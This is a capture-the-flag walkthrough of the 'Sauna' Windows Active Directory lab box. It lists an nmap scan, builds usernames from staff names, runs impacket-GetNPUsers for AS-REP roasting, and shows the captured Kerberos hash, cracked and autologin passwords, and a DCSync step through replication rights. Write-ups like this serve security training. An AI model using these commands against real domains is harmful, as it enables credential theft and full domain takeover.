---
title: Sauna
date: 2026-08-27
description: Easy Windows AD machine harvesting names from a bank website's team page, using username-anarchy to AS-REP roast a valid account, and chaining an autologin cleartext password into DCSync.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Thu Aug 27 10:14:01 2026 as: /usr/lib/nmap/nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696 -A -oN scan_results.txt 10.129.4.220
Nmap scan report for sauna.htb (10.129.4.220)
Host is up (0.34s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-27 21:20:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h06m11s
| smb2-time: 
|   date: 2026-08-27T21:21:36
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   311.11 ms 10.10.16.1
2   311.09 ms sauna.htb (10.129.4.220)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 27 10:16:15 2026 -- 1 IP address (1 host up) scanned in 134.62 seconds

```

- Guest can list SMB shares
- LDAP anonymous bind turned up nothing

# User

The About page lists the bank's **Team Members** in plain HTML:

```text
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

> Windows accounts get built from first name + last name combinations — no spaces between them.

### username-anarchy

> https://github.com/urbanadventurer/username-anarchy

Generates the realistic candidates from the name list:

```sh
./username-anarchy --input-file users.txt --select-format flast,first.last > usersmod.txt
```

```text
fergus.smith
fsmith
hugo.bear
hbear
steven.kerb
skerb
shaun.coins
scoins
bowie.taylor
btaylor
sophie.driver
sdriver
```

Check which accounts have Kerberos pre-authentication disabled with `GetNPUsers`:

```sh
impacket-GetNPUsers EGOTISTICAL-BANK.local/ -usersfile usersmod.txt -no-pass -dc-ip 10.129.4.220
```

`fsmith` had pre-auth disabled — back to rockyou for the hash:

```text
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:dac22607b313e98a6c99d9277ee84cea$d921f7cf82e87331758f38bb7f93449cdc36a273d6fb79f4ef1ac1a845afde5333d0b747d95f2794e92fc1c89253123357af4a944e971cba22308fa89b3f4184e2fdb3cb494b41eb4a66ff3249f26e00dfd251e48e61b5d2d7748369d1a3865c8155a28fca870f8946d4fd29941094973205e66e4760534ba7eac2d041906bac59f475237ae287ae0441cd442785e83a9f2cb45e93c44d268ece988693689b07bd0b6bbf539ab6e19fcdc4d517ec6bdf62d4556bd47a5dd3c3f2091438c27fc04611dc11fb8bc570ddb8fa84c403dbc964636560a912f29cc31bd510020ac964a0771f390462ec8eb721116961e7264d13cf545b0f7eb96994bc2a312049e99e
```

# Root

> `fsmith - Thestrokes23`

Shell through evil-winrm, then run WinPEAS and SharpHound for the lay of the land. WinPEAS checks the registry for cleartext passwords of accounts configured for autologin — and this box obliged:

> `svc_loanmanager - Moneymakestheworldgoround`

The registry name is a decoy — the real account is `svc_loanmgr`. BloodHound showed it holds **GetChangesAll** over the domain (both replication permissions), which is exactly what DCSync needs. Run `secretsdump` as that user to pull the NTLM hashes:

Gained `root`
